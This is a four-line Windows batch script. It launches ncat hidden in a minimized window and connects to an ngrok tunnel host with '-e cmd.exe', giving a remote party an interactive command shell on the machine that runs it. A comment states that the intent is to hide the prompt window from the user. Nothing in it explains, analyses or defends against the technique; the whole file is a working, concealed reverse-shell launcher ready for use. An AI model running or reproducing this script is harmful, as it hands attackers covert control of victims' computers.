@echo off
:: Hide the command prompt window
start /min cmd /c "%~dp0ncat.exe 7.tcp.eu.ngrok.io 27814 -e cmd.exe"
exit